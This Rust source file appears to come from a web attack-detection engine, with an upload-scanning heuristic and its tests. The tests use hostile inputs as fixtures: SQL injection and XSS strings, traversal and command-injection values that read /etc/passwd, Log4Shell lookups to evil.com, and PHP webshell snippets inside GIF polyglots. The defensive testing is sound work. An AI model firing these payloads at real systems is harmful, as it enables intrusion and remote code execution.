/// declared type, executables disguised as images, and polyglot payloads
/// (GIF+PHP, JPEG with appended webshell, EXIF comment scripts).
pub struct UploadImage {
    scan: crate::uploads::UploadsScan,
}

impl UploadImage {
    /// Build with an `[uploads]` projection.
    pub fn new(scan: crate::uploads::UploadsScan) -> Self {
        Self { scan }
    }
}

impl Heuristic for UploadImage {
    fn name(&self) -> &'static str {
        "upload_image"
    }
    fn analyze(&self, evt: &Event, text: &DecodedHttp<'_>) -> Vec<Signal> {
        if !self.scan.enabled {
            return vec![];
        }
        for part in &text.uploads {
            if part.filename.is_none() {
                continue;
            }
            if let Some(sig) = self.inspect(
                part.content,
                part.filename.as_deref(),
                part.content_type.as_deref(),
            ) {
                return vec![sig];
            }
        }
        // Direct binary upload (PUT/POST of an image or opaque body without
        // multipart framing): the whole body is one unnamed file.
        if let Some(http) = evt.http() {
            if text.uploads.is_empty() {
                if let Some(body) = http.body.as_deref() {
                    let ct = http.headers.get("content-type").map(|s| s.as_str());
                    let binary_put = matches!(
                        http.method,
                        Some(crate::event::HttpMethod::Put | crate::event::HttpMethod::Post)
                    ) && ct.is_some_and(|c| {
                        let c = c.to_ascii_lowercase();
                        c.starts_with("image/") || c.starts_with("application/octet-stream")
                    });
                    if binary_put {
                        if let Some(sig) = self.inspect(body, None, ct) {
                            return vec![sig];
                        }
                    }
                }
            }
        }
        vec![]
    }
}

impl UploadImage {
    fn inspect(
        &self,
        content: &[u8],
        filename: Option<&str>,
        content_type: Option<&str>,
    ) -> Option<Signal> {
        if content.is_empty() {
            return None;
        }
        let kind = crate::uploads::sniff_kind(content, filename, content_type);
        let declared_img = crate::uploads::declared_image(filename, content_type);
        use crate::event::UploadKind;
        if declared_img
            && matches!(
                kind,
                UploadKind::Archive | UploadKind::Executable | UploadKind::Pdf
            )
        {
            return Some(Signal {
                kind: SignalKind::UploadTypeMismatch,
                weight: upload_weight(&self.scan, crate::analysis::UPLOAD_TYPE_MISMATCH_WEIGHT),
                detail: Some(format!(
                    "declared image carries {kind:?} bytes: {}",
                    filename.unwrap_or("<unnamed>")
                )),
            });
        }
        if kind == UploadKind::Executable {
            return Some(Signal {
                kind: SignalKind::UploadExecutable,
                weight: upload_weight(&self.scan, crate::analysis::UPLOAD_EXECUTABLE_WEIGHT),
                detail: Some(format!(
                    "executable upload: {}",
                    filename.unwrap_or("<unnamed>")
                )),
            });
        }
        if let Some(marker) = crate::uploads::hidden_payload_markers(content, kind) {
            return Some(Signal {
                kind: SignalKind::UploadPolyglot,
                weight: upload_weight(&self.scan, crate::analysis::UPLOAD_POLYGLOT_WEIGHT),
                detail: Some(format!(
                    "hidden payload marker {marker:?} in {}",
                    filename.unwrap_or("<unnamed>")
                )),
            });
        }
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::event::{HttpData, ProtocolData, SourceKind};
    use std::net::Ipv4Addr;

    fn http_evt(path: &str, ua: Option<&str>) -> Event {
        Event::new(
            SourceKind::Synthetic,
            std::net::IpAddr::V4(Ipv4Addr::new(1, 2, 3, 4)),
            ProtocolData::Http(HttpData {
                path: path.to_string(),
                user_agent: ua.map(String::from),
                ..Default::default()
            }),
        )
    }

    fn text_of(e: &Event) -> DecodedHttp<'_> {
        e.http().map(DecodedHttp::of).unwrap_or_default()
    }

    #[test]
    fn detects_sqli() {
        let e = http_evt("/login?user=admin'+OR+1=1--", None);
        let signals = SqlInjection.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
        assert_eq!(signals[0].kind, SignalKind::SqlInjection);
    }

    #[test]
    fn detects_xss() {
        let e = http_evt("/search?q=<script>alert(1)</script>", None);
        let signals = Xss.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
        assert_eq!(signals[0].kind, SignalKind::Xss);
    }

    #[test]
    fn detects_path_traversal() {
        let e = http_evt("/../../../etc/passwd", None);
        let signals = PathTraversal.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
    }

    #[test]
    fn detects_lfi() {
        let e = http_evt("/page?file=/etc/shadow", None);
        let signals = Lfi.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
        assert_eq!(signals[0].kind, SignalKind::Lfi);
    }

    #[test]
    fn detects_lfi_php_filter() {
        let e = http_evt(
            "/?page=php://filter/convert.base64-encode/resource=index",
            None,
        );
        let signals = Lfi.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
    }

    #[test]
    fn detects_log4shell() {
        let e = http_evt("/", Some("${jndi:ldap://evil.com/x}"));
        let signals = Log4Shell.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
    }

    #[test]
    fn detects_sensitive_path() {
        let e = http_evt("/.env", None);
        let signals = SensitivePath.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
    }

    #[test]
    fn detects_bad_crawler() {
        let e = http_evt("/", Some("sqlmap/1.0"));
        let signals = BadCrawler.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
    }

    #[test]
    fn detects_empty_ua() {
        let e = http_evt("/", None);
        let signals = EmptyUserAgent.analyze(&e, &text_of(&e));
        assert!(!signals.is_empty());
    }

    #[test]
    fn clean_request_no_signals() {
        let e = http_evt("/api/users?page=1", Some("Mozilla/5.0"));
        let engine = HeuristicEngine::with_defaults();
        let signals = engine.analyze(&e);
        assert!(signals.is_empty(), "expected no signals, got {signals:?}");
    }

    #[test]
    fn engine_runs_all_detectors() {
        let e = http_evt("/.env?q=<script>alert(1)</script>", Some("sqlmap/1.0"));
        let engine = HeuristicEngine::with_defaults();
        let signals = engine.analyze(&e);
        assert!(
            signals.len() >= 3,
            "expected at least 3 signals, got {signals:?}"
        );
    }

    // ── Upload heuristics (F10) ──────────────────────────────────────────

    use crate::config::UploadsConfig;
    use crate::uploads::UploadsScan;

    fn upload_engine(mode_enforce: bool) -> HeuristicEngine {
        let mut cfg = UploadsConfig {
            enabled: true,
            ..UploadsConfig::default()
        };
        if mode_enforce {
            cfg.mode = crate::config::UploadMode::Enforce;
        }
        HeuristicEngine::with_defaults().with_uploads_scan(UploadsScan::from_config(&cfg))
    }

    fn upload_evt(
        content_type: &str,
        body: Vec<u8>,
        method: Option<crate::event::HttpMethod>,
    ) -> Event {
        let mut headers = std::collections::HashMap::new();
        headers.insert("content-type".to_string(), content_type.to_string());
        Event::new(
            SourceKind::Synthetic,
            std::net::IpAddr::V4(Ipv4Addr::new(1, 2, 3, 4)),
            ProtocolData::Http(HttpData {
                path: "/upload".to_string(),
                method,
                headers,
                body: Some(body),
                user_agent: Some("Mozilla/5.0".to_string()),
                ..Default::default()
            }),
        )
    }

    fn multipart_body(filename: &str, content_type: &str, content: &[u8]) -> Vec<u8> {
        let mut out = Vec::new();
        out.extend_from_slice(b"--XBOUND\r\n");
        out.extend_from_slice(
            format!("Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n")
                .as_bytes(),
        );
        out.extend_from_slice(format!("Content-Type: {content_type}\r\n\r\n").as_bytes());
        out.extend_from_slice(content);
        out.extend_from_slice(b"\r\n--XBOUND--\r\n");
        out
    }

    const MULTIPART_CT: &str = "multipart/form-data; boundary=XBOUND";

    #[test]
    fn upload_sqli_in_filename_is_detected() {
        let e = upload_evt(
            MULTIPART_CT,
            multipart_body("' OR 1=1--.png", "image/png", b"\x89PNG\r\n\x1a\n"),
            Some(crate::event::HttpMethod::Post),
        );
        let signals = upload_engine(true).analyze(&e);
        let sig = signals
            .iter()
            .find(|s| s.kind == SignalKind::SqlInjection)
            .expect("sqli filename must be flagged");
        assert_eq!(sig.weight, 60);
        assert!(sig.detail.as_deref().unwrap().contains("upload filename"));
    }

    #[test]
    fn upload_svg_with_script_flags_xss_via_content() {
        let svg = b"<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>";
        let e = upload_evt(
            MULTIPART_CT,
            multipart_body("logo.svg", "image/svg+xml", svg),
            Some(crate::event::HttpMethod::Post),
        );
        let signals = upload_engine(true).analyze(&e);
        assert!(signals.iter().any(|s| s.kind == SignalKind::Xss));
    }

    #[test]
    fn upload_gif_php_polyglot_flags_polyglot() {
        let mut content = b"GIF89a".to_vec();
        content.extend_from_slice(&[0; 16]);
        content.extend_from_slice(b"<?php system($_GET['c']); ?>");
        let e = upload_evt(
            MULTIPART_CT,
            multipart_body("avatar.gif", "image/gif", &content),
            Some(crate::event::HttpMethod::Post),
        );
        let signals = upload_engine(true).analyze(&e);
        let sig = signals
            .iter()
            .find(|s| s.kind == SignalKind::UploadPolyglot)
            .expect("GIF+PHP polyglot must be flagged");
        assert_eq!(sig.weight, 60);
    }

    #[test]
    fn upload_exe_disguised_as_image_flags_mismatch() {
        let e = upload_evt(
            MULTIPART_CT,
            multipart_body("setup.jpg", "image/jpeg", b"MZ\x90\x00executable"),
            Some(crate::event::HttpMethod::Post),
        );
        let signals = upload_engine(true).analyze(&e);
        assert!(signals
            .iter()
            .any(|s| s.kind == SignalKind::UploadTypeMismatch));
    }

    #[test]
    fn upload_blocked_extension_flags_executable() {
        let e = upload_evt(
            MULTIPART_CT,
            multipart_body("shell.php", "application/octet-stream", b"<?php echo 1;"),
            Some(crate::event::HttpMethod::Post),
        );
        let signals = upload_engine(true).analyze(&e);
        let sig = signals
            .iter()
            .find(|s| s.kind == SignalKind::UploadExecutable)
            .expect(".php upload must be flagged");
        assert_eq!(sig.weight, 50);
    }

    #[test]
    fn upload_clean_png_stays_quiet() {
        let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
        png.extend_from_slice(&[0; 64]);
        let e = upload_evt(
            MULTIPART_CT,
            multipart_body("photo.png", "image/png", &png),
            Some(crate::event::HttpMethod::Post),
        );
        assert!(upload_engine(true).analyze(&e).is_empty());
    }

    #[test]
    fn upload_form_field_sqli_is_detected() {
        let e = upload_evt(
            "application/x-www-form-urlencoded",
            b"user=admin%27+OR+1%3D1--&next=/".to_vec(),
            Some(crate::event::HttpMethod::Post),
        );
        let signals = upload_engine(true).analyze(&e);
        let sig = signals
            .iter()
            .find(|s| s.kind == SignalKind::SqlInjection)
            .expect("urlencoded sqli must be flagged");
        assert!(sig.detail.as_deref().unwrap().contains("form field user"));
    }

    #[test]
    fn upload_json_body_scan_is_gated_by_config() {
        let clean = upload_evt(
            "application/json",
            br#"{"comment":"hello world","n":42}"#.to_vec(),
            Some(crate::event::HttpMethod::Post),
        );
        assert!(upload_engine(true).analyze(&clean).is_empty());
        let payload = br#"{"q":"' OR 1=1--"}"#.to_vec();
        let e = upload_evt(
            "application/json",
            payload,
            Some(crate::event::HttpMethod::Post),
        );
        assert!(upload_engine(true)
            .analyze(&e)
            .iter()
            .any(|s| s.kind == SignalKind::SqlInjection));
        let cfg = UploadsConfig {
            enabled: true,
            mode: crate::config::UploadMode::Enforce,
            scan_json: false,
            ..Default::default()
        };
        let engine =
            HeuristicEngine::with_defaults().with_uploads_scan(UploadsScan::from_config(&cfg));
        assert!(
            engine.analyze(&e).is_empty(),
            "scan_json=false skips json bodies"
        );
    }

    #[test]
    fn upload_shadow_mode_zeroes_weights_but_still_detects() {
        let content = format!("GIF89a{}", "<?php eval($_POST); ?>");
        let e = upload_evt(
            MULTIPART_CT,
            multipart_body("cat.gif", "image/gif", content.as_bytes()),
            Some(crate::event::HttpMethod::Post),
        );
        let signals = upload_engine(false).analyze(&e);
        let sig = signals
            .iter()
            .find(|s| s.kind == SignalKind::UploadPolyglot)
            .expect("shadow mode still detects");
        assert_eq!(sig.weight, 0);
    }

    #[test]
    fn upload_inspection_disabled_is_zero_cost() {
        let content = format!("GIF89a{}", "<?php eval($_POST); ?>");
        let e = upload_evt(
            MULTIPART_CT,
            multipart_body("cat.gif", "image/gif", content.as_bytes()),
            Some(crate::event::HttpMethod::Post),
        );
        assert!(HeuristicEngine::with_defaults().analyze(&e).is_empty());
    }

    #[test]
    fn upload_direct_binary_put_is_scanned() {
        let e = upload_evt(
            "image/png",
            b"MZ\x90\x00not-really-png".to_vec(),
            Some(crate::event::HttpMethod::Put),
        );
        let signals = upload_engine(true).analyze(&e);
        assert!(signals
            .iter()
            .any(|s| s.kind == SignalKind::UploadTypeMismatch));
    }
}

#[cfg(test)]
mod proptests {
    use super::*;
    use crate::event::{HttpData, ProtocolData, SourceKind};
    use proptest::prelude::*;

    fn http_evt(path: &str, ua: Option<&str>) -> Event {
        Event::new(
            SourceKind::Synthetic,
            std::net::IpAddr::V4(std::net::Ipv4Addr::new(1, 2, 3, 4)),
            ProtocolData::Http(HttpData {
                path: path.to_string(),
                user_agent: ua.map(String::from),
                ..Default::default()
            }),
        )
    }

    fn text_of(e: &Event) -> DecodedHttp<'_> {
        e.http().map(DecodedHttp::of).unwrap_or_default()
    }

    proptest! {
        #[test]
        fn proptest_sqli_union_select(payload in "(?i)union\\s+select") {
            let e = http_evt(&format!("/?id={payload}"), None);
            let signals = SqlInjection.analyze(&e, &text_of(&e));
            prop_assert!(!signals.is_empty());
        }

        #[test]
        fn proptest_sqli_or_1_1(sep in r#"['"]"#) {
            let payload = format!("{sep} OR 1=1--");
            let e = http_evt(&format!("/?id={payload}"), None);
            let signals = SqlInjection.analyze(&e, &text_of(&e));
            prop_assert!(!signals.is_empty());
        }

        #[test]
        fn proptest_xss_script_tag(inner in r#"[a-zA-Z0-9]{1,20}"#) {
            let payload = format!("/?q=<script>alert({inner})</script>");
            let e = http_evt(&payload, None);
            let signals = Xss.analyze(&e, &text_of(&e));
            prop_assert!(!signals.is_empty());
        }

        #[test]
        fn proptest_path_traversal_encoded(count in 1usize..=5) {
            let payload = "%2e%2e%2f".repeat(count);
            let e = http_evt(&format!("/{payload}"), None);
            let signals = PathTraversal.analyze(&e, &text_of(&e));
            prop_assert!(!signals.is_empty());
        }

        #[test]
        fn proptest_log4shell_jndi(host in r#"[a-z]{1,10}\.com"#) {
            let payload = format!("${{jndi:ldap://{host}/x}}");
            let e = http_evt("/", Some(&payload));
            let signals = Log4Shell.analyze(&e, &text_of(&e));
            prop_assert!(!signals.is_empty());
        }

        #[test]
        fn proptest_clean_request_no_sqli(
            path in r#"/api/[a-z]+/[0-9]+"#,
            q in r#"[a-z]=[a-z0-9]{1,20}"#
        ) {
            let full = format!("{path}?{q}");
            let e = http_evt(&full, Some("Mozilla/5.0"));
            let signals = SqlInjection.analyze(&e, &text_of(&e));
            prop_assert!(signals.is_empty(), "false positive on {full}");
        }
    }

    /// Gating must never change the signal set: for arbitrary request
    /// strings, the gated engine returns exactly what the ungated one does.
    #[test]
    fn engine_gating_equivalence_corpus() {
        let corpus = [
            "/api/users?page=1",
            "/",
            "/login?user=admin'+OR+1=1--",
            "/?id=1%20UNION%20SELECT%20password",
            "/search?q=<script>alert(1)</script>",
            "/?q=<img src=x onerror=alert(1)>",
            "/?x=javascript:void(0)",
            "/../../../etc/passwd",
            "/%2e%2e%2f%2e%2e%2fboot.ini",
            "/download?file=../../windows/system32/config",
            "/?page=php://filter/convert.base64-encode/resource=index",
            "/?f=file:///etc/shadow",
            "/x.jsp?i=${jndi:ldap://evil.com/a}",
            "/api?callback=${JNDI:rmi://x/y}",
            "/cmd?exec=;cat%20/etc/passwd",
            "/ping?host=1|whoami",
            "/run?c=`id`",
            "/api?x=$(uname%20-a)",
            "/a?b=1&&ls",
            "/.env",
            "/.git/config",
            "/wp-admin/setup.php",
            "/phpmyadmin/index.php",
            "/backup.sql",
            "/site.old",
            "/manager/html",
            "/actuator/env",
            "/server-status",
            "/_ignition/execute-solution",
            "/Autodiscover/Autodiscover.xml",
            "/mifs/.;/services/LogService",
            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/HNAP1",
            "/remote/fgt_lang",
            "/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application",
            "/RestAPI/LogonCustomization",
            "/Telerik.Web.UI.WebResource.axd",
            "/GponForm/diag_Form",
            "/wp-includes/js/jquery/jquery.php",
            "/adminer.php",
            "/",
            "/go_http_client",
            "/x?ua=python-requests/2.0",
            "/api/v2/health?check=ok&token=abc",
            "/static/main.css?v=123",
        ];
        let engine = HeuristicEngine::with_defaults();
        for path in corpus {
            let e = http_evt(path, Some("Mozilla/5.0 (compatible)"));
            let gated = engine.analyze(&e);
            let ungated = engine.analyze_ungated(&e);
            assert_eq!(
                gated.len(),
                ungated.len(),
                "gating changed the signal count on {path}: {gated:?} vs {ungated:?}"
            );
            for (g, u) in gated.iter().zip(ungated.iter()) {
                assert_eq!(g.kind, u.kind, "kind mismatch on {path}");
                assert_eq!(g.weight, u.weight, "weight mismatch on {path}");
            }
        }
    }

    /// Prefilter soundness: if a family's regex matches a field, the
    /// automaton must have found one of that family's triggers in it.
    /// Guards the trigger tables against drift from the `*_RE` regexes.
    #[test]
    fn prefilter_triggers_are_necessary_literals() {
        let samples = [
            "",
            "/",
            "abc",
            "' OR 1=1--",
            "1 UNION SELECT * FROM users",
            "x'; DROP TABLE users;--",
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:document.cookie",
            "../../etc/passwd",
            "..%2f..%2fproc/self/environ",
            "%2e%2e%5cwin.ini",
            "file:///c:\\windows\\system32",
            "php://input",
            "data://text/plain",
            "expect://id",
            "${jndi:ldap://x}",
            "${JNDI:dns://y}",
            ";cat /etc/passwd",
            "|whoami",
            "`uname`",
            "$(id)",
            "&&ls",
            "/.env",
            "/.aws/credentials",
            "/wp-login.php",
            "/pma/",
            "/actuator/heapdump",
            "/backup.old",
            "/db.sql",
            "/manager/html",
            "/server-info",
            "/_ignition/execute-solution",
            "/autodiscover/autodiscover.xml",
            "/mifs/.;/services/LogService",
            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/hnap1",
            "/remote/fgt_lang",
            "/ecp/current/exporttool/microsoft.exchange.ediscovery.exporttool.application",
            "/restapi/logoncustomization",
            "/telerik.web.ui.webresource.axd",
            "/gponform/diag_form",
            "/wp-includes/js/jquery/jquery.php",
            "sqlmap/1.5",
            "Nmap Scripting Engine",
            "python-requests/2.31",
            "go-http-client/2.0",
            "Hydra v9",
            "masscan/1.3",
            "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
            "ffuf/2.1",
            "feroxbuster/2.10",
            "dirsearch/v0.4.3",
        ];
        let pf = PREFILTER.load();
        for t in samples {
            let check = |bit: u8, hit: bool, family: &str| {
                assert!(
                    !hit || pf.family_hit(bit, t),
                    "{family} regex matched {t:?} but no trigger literal was found"
                );
            };
            check(gate::SQLI, SQLI_RE.is_match(t), "sqli");
            check(gate::XSS, XSS_RE.is_match(t), "xss");
            check(gate::TRAVERSAL, PATH_TRAVERSAL_RE.is_match(t), "traversal");
            check(gate::LFI, LFI_RE.is_match(t), "lfi");
            check(gate::LOG4SHELL, LOG4SHELL_RE.is_match(t), "log4shell");
            check(gate::CMD, CMD_INJECTION_RE.is_match(t), "cmd");
            check(
                gate::SENSITIVE,
                SENSITIVE_PATH_RE.load().is_match(&t.to_ascii_lowercase()),
                "sensitive",
            );
            check(
                gate::CRAWLER,
                BAD_CRAWLER_RE.load().is_match(&t.to_ascii_lowercase()),
                "crawler",
            );
        }
    }
}
